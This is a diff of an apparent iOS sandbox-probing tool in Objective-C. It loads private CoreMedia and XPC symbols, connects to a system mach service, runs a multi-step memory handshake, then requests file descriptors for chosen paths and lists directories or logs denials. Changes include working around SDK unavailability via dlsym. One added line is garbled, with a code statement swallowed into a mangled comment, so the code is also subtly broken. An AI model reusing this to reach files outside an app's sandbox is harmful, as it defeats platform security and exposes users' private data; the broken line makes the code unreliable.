@@ -34,6 +34,7 @@ typedef xpc_object_t (*fn_val)(xpc_object_t msg, const char *key);
 typedef uint64_t     (*fn_u64)(xpc_object_t msg, const char *key);
 typedef int64_t      (*fn_i64)(xpc_object_t msg, const char *key);
 typedef int32_t      (*fn_dupfd)(xpc_object_t msg, const char *key);
+typedef xpc_connection_t (*fn_conncreate)(const char *name, dispatch_queue_t target, uint64_t flags);
 
 static fn_basic  fBasic;
 static fn_begin  fBegin;
@@ -45,6 +46,7 @@ static fn_val    fVal;
 static fn_u64    fU64;
 static fn_i64    fI64;
 static fn_dupfd  fDupFd;
+static fn_conncreate fConnCreate;
 
 static xpc_connection_t gConn;
 static NSMutableArray  *gProduced;
@@ -86,30 +88,30 @@ static BOOL writeText(NSString *name, NSString *body) {
 #pragma mark - Connection and handshake
 
 static xpc_object_t sendSync(xpc_object_t msg) {
-    if (msg == NULL || gConn == NULL) return NULL;
-    __block xpc_object_t reply = NULL;
+    if (msg == nil || gConn == nil) return nil;
+    __block xpc_object_t reply = nil;
     dispatch_semaphore_t sem = dispatch_semaphore_create(0);
 
     xpc_connection_send_message_with_reply(gConn, msg,
         dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
         ^(xpc_object_t object) {
-            if (object != NULL) reply = object;
+            if (object != nil) reply = object;
             dispatch_semaphore_signal(sem);
         });
 
     if (dispatch_semaphore_wait(sem,
             dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8ull * NSEC_PER_SEC))) != 0) {
-        return NULL;
+        return nil;
     }
     return reply;
 }
 
 static BOOL resolveSymbols(void) {
-    if (fBasic != NULL) return YES;
+    if (fBasic != nil) return YES;
 
     void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                       RTLD_NOW | RTLD_LOCAL);
-    if (cm == NULL) {
+    if (cm == nil) {
         logLine(@"dlopen CoreMedia failed: %s", dlerror());
         return NO;
     }
@@ -127,9 +129,11 @@ static BOOL resolveSymbols(void) {
     fI64    = (fn_i64)    dlsym(rtld, "xpc_dictionary_get_int64");
     fDupFd  = (fn_dupfd)  dlsym(rtld, "xpc_dictionary_dup_fd");
     fSetU64 = (fn_setu64) dlsym(rtld, "xpc_dictionary_set_uint64");
+    // ?????? iOS SDK ????????unavailable?????dlsym ??    fConnCreate = (fn_conncreate) dlsym(rtld, "xpc_connection_create_mach_service");
 
-    if (fBasic == NULL || fBegin == NULL || fComp == NULL || fRecip == NULL ||
-        fSetURL == NULL || fDupFd == NULL || fVal == NULL || fU64 == NULL) {
+    if (fBasic == nil || fBegin == nil || fComp == nil || fRecip == nil ||
+        fSetURL == nil || fDupFd == nil || fVal == nil || fU64 == nil ||
+        fConnCreate == nil) {
         logLine(@"dlsym missing: basic=%p begin=%p comp=%p recip=%p seturl=%p dupfd=%p",
                 fBasic, fBegin, fComp, fRecip, fSetURL, fDupFd);
         return NO;
@@ -138,12 +142,12 @@ static BOOL resolveSymbols(void) {
 }
 
 static BOOL connectService(const char *name) {
-    if (gConn != NULL) {
+    if (gConn != nil) {
         xpc_connection_cancel(gConn);
-        gConn = NULL;
+        gConn = nil;
     }
-    gConn = xpc_connection_create_mach_service(name, NULL, 0);
-    if (gConn == NULL) {
+    gConn = fConnCreate(name, nil, 0);
+    if (gConn == nil) {
         logLine(@"connect failed: %s", name);
         return NO;
     }
@@ -155,41 +159,41 @@ static BOOL connectService(const char *name) {
 
 static BOOL handshake(void) {
     // '.rp1' : memory recipient, first message
-    xpc_object_t m1 = NULL;
-    if (fBasic(0x2e727031, 0, &m1) != 0 || m1 == NULL) {
+    xpc_object_t m1 = nil;
+    if (fBasic(0x2e727031, 0, &m1) != 0 || m1 == nil) {
         logLine(@"STEP3 rp1 basic message failed");
         return NO;
     }
     xpc_object_t r1 = sendSync(m1);
-    if (r1 == NULL || xpc_get_type(r1) != XPC_TYPE_DICTIONARY) {
+    if (r1 == nil || xpc_get_type(r1) != XPC_TYPE_DICTIONARY) {
         logLine(@"STEP3 rp1 reply is not a dictionary");
         return NO;
     }
     logLine(@"STEP3 rp1 reply=dictionary");
 
     // '.rp2' : fold the first reply into the recipient context
-    xpc_object_t m2 = NULL;
-    if (fBasic(0x2e727032, 0, &m2) == 0 && m2 != NULL) {
-        xpc_object_t recip = NULL;
+    xpc_object_t m2 = nil;
+    if (fBasic(0x2e727032, 0, &m2) == 0 && m2 != nil) {
+        xpc_object_t recip = nil;
         int32_t rs = fRecip(r1, m2, "mconf", &recip);
         xpc_object_t r2 = sendSync(m2);
         logLine(@"STEP3 rp2 recipSt=%d reply=%s",
-                rs, (r2 != NULL && xpc_get_type(r2) == XPC_TYPE_DICTIONARY) ? "dict" : "other");
+                rs, (r2 != nil && xpc_get_type(r2) == XPC_TYPE_DICTIONARY) ? "dict" : "other");
     }
 
     // '.org' : memory origin begin / complete
-    xpc_object_t om = NULL;
-    if (fBasic(0x2e6f7267, 0, &om) != 0 || om == NULL) {
+    xpc_object_t om = nil;
+    if (fBasic(0x2e6f7267, 0, &om) != 0 || om == nil) {
         logLine(@"STEP3 org basic message failed");
         return NO;
     }
     int32_t bs = fBegin(om);
     xpc_object_t orr = sendSync(om);
     BOOL ok = NO;
-    if (orr != NULL && xpc_get_type(orr) == XPC_TYPE_DICTIONARY) {
-        xpc_object_t origin = NULL;
+    if (orr != nil && xpc_get_type(orr) == XPC_TYPE_DICTIONARY) {
+        xpc_object_t origin = nil;
         int32_t cs = fComp(orr, &origin);
-        ok = (origin != NULL);
+        ok = (origin != nil);
         logLine(@"STEP3 org beginSt=%d completeSt=%d origin=%s",
                 bs, cs, ok ? "true" : "false");
     } else {
@@ -205,16 +209,16 @@ static void takeFd(NSString *tag, int32_t fd) {
     int fs = fstat(fd, &st);
 
     // directory: real readdir
-    if (fs == 0 && (st.st_mode & 0o170000) == 0o040000) {
+    if (fs == 0 && (st.st_mode & 0170000) == 0040000) {
         DIR *dp = fdopendir(fd);
-        if (dp == NULL) {
+        if (dp == nil) {
             logLine(@"DIR[%@] fdopendir failed errno=%d", tag, errno);
             close(fd);
             return;
         }
         NSMutableArray *names = [NSMutableArray array];
         struct dirent *de;
-        while ((de = readdir(dp)) != NULL && names.count < 4000) {
+        while ((de = readdir(dp)) != nil && names.count < 4000) {
             NSString *n = [NSString stringWithUTF8String:de->d_name];
             if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
                 [names addObject:n];
@@ -272,8 +276,8 @@ static void takeFd(NSString *tag, int32_t fd) {
 #pragma mark - single probe
 
 static void probe(NSString *tag, NSString *path) {
-    xpc_object_t msg = NULL;
-    if (fBasic(0x4375726c, 0, &msg) != 0 || msg == NULL) {   // 'Curl'
+    xpc_object_t msg = nil;
+    if (fBasic(0x4375726c, 0, &msg) != 0 || msg == nil) {   // 'Curl'
         logLine(@"PROBE[%@] basic message failed", tag);
         return;
     }
@@ -282,7 +286,7 @@ static void probe(NSString *tag, NSString *path) {
     fSetU64(msg, "FileOpenOptions", 0);
 
     xpc_object_t reply = sendSync(msg);
-    if (reply == NULL) {
+    if (reply == nil) {
         logLine(@"PROBE[%@] timeout", tag);
         return;
     }
@@ -292,7 +296,7 @@ static void probe(NSString *tag, NSString *path) {
     }
 
     xpc_object_t details = fVal(reply, "ByteStreamDetails");
-    if (details == NULL) {
+    if (details == nil) {
         logLine(@"DENIED[%@] err=%lld path=%@", tag, fI64(reply, ".ErrorReturn"), path);
         return;
     }
